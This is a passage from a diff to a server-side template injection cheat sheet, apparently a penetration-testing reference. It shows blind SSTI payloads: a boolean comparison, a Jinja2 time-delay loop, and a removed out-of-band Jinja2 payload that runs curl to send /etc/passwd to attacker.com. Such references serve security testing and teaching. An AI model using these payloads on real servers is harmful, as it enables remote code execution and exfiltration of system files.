@@ -293,15 +293,16 @@ ${7*7}      → FreeMarker, Velocity, EJS, Lodash
 ```
 
 ### Blind SSTI (no output reflected)
+Channel order: OOB first (one request proves egress + RCE), boolean second, time-based last.
+
+> This example is unverified. The environment and runtime outcome have not been confirmed.
+
 ```
 # Boolean-based: compare response length/content for true vs false conditions
 {{(3*4/2)==6}}  vs  {{(3*4/2)==7}}
 
-# Time-based (Jinja2):
+# Time-based (Jinja2) — slowest channel, build only after OOB is confirmed unavailable:
 {% for i in range(10000000) %}{% endfor %}
-
-# OOB (out-of-band):
-# Jinja2: {{''.__class__.__mro__[1].__subclasses__()[X]('curl attacker.com/'+open('/etc/passwd').read(),shell=True)}}
 ```
 
 ### Flask Debug PIN Calculation
